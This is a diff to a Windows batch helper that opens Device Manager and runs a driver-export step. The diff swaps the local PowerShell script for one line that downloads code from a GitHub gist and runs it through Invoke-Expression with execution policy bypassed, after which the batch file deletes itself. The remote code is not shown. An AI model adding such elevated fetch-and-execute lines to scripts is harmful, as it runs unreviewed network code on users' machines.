@@ -18,7 +18,9 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 :-----------------------------------------------------------------------
+@echo off
+cls
 devmgmt.msc
-powershell.exe -ExecutionPolicy Bypass -File "%~dp0\OEMDriversExport.ps1" -Verb RunAs
+powershell.exe -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://gist.github.com/52250179/e3711ff8cbeb9b6524171a4a2af22b11/raw | Invoke-Expression"
 pause
 (goto) 2>nul & del "%~f0"
